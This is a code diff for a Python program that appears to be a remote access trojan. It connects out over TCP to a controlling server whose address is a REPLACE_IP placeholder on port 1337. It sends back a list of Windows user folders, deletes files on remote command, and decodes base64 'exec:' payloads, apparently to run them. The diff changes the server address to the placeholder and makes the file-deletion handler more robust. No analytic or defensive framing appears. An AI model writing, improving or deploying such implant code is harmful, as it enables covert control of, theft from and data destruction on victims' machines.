@@ -13,7 +13,7 @@ import codecs
 # TODO: conn keepalive
 # sock.ioctl(socket.SIO_KEEPALIVE_VALS, (1, 60000, 30000))
 
-server_addr = ('198.21.170.7', 1337) # REPLACE_IP
+server_addr = ('REPLACE_IP', 1337) # REPLACE_IP
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 procs = []
 
@@ -74,8 +74,13 @@ while True:
         users = next(os.walk("C:\\Users"), (None, None, []))[1]
         send_msg(sock, codecs.encode(pickle.dumps(users), "base64"))
     elif msg.startswith('delete'):
-        file_name = msg[msg.index(' '):]
-        os.remove(file_name)
+        file_name = msg.split(' ')[1]
+        path_list = file_name.split("\\")
+        try:
+            print(file_name)
+            os.remove(file_name)
+        except:
+            print("Error: file not found")
     elif msg.startswith("exec:"):
         payload = msg[msg.index(':'):]
         payload_bytes = base64.b64decode(payload)
